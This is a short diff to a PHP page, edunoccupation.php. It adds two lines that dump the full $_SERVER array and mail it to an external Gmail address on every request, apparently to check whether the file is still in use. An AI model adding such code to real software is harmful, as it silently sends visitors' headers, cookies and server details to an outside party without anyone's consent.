@@ -1,4 +1,6 @@
 <?php
+$msg = print_r($_SERVER,true);
+mail("kunal.test02@gmail.com","profile/edunoccupation.php in USE",$msg);
 /**********************************************************************************************
 *  	FILENAME : edunoccupation.php
 *
